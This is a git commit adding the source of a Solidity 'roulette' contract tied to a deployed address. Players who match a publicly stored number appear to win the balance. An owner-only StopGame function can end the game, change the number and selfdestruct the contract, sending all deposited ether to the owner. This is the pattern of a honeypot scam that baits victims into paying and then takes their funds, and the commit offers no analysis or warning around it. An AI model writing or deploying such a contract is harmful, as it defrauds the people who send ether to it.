f864dc9ed3a75080cd8f577e6a7fa4c6a6ed139c
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-17 09:38:31 +0700

    add contract R

---
+++ R.sol
@@ -0,0 +1,57 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract R at 0xd87eaad7afb256c69526a490f402a658f12246fd
+*/
+pragma solidity ^0.4.20;
+
+contract R
+{
+
+    uint8 public result = 0;
+
+    bool public finished = false;
+
+    address public rouletteOwner;
+
+    function Play(uint8 _number)
+    external
+    payable
+    {
+        require(msg.sender == tx.origin);
+        if(result == _number && msg.value>0.001 ether && !finished)
+        {
+            msg.sender.transfer(this.balance);
+            GiftHasBeenSent();
+        }
+    }
+
+    function StartRoulette(uint8 _number)
+    public
+    payable
+    {
+        if(result==0)
+        {
+            result = _number;
+            rouletteOwner = msg.sender;
+        }
+    }
+
+    function StopGame(uint8 _number)
+    public
+    payable
+    {
+        require(msg.sender == rouletteOwner);
+        GiftHasBeenSent();
+        result = _number;
+        if (msg.value>0.001 ether){
+            selfdestruct(rouletteOwner);
+        }
+    }
+
+    function GiftHasBeenSent()
+    private
+    {
+        finished = true;
+    }
+
+    function() public payable{}
+}
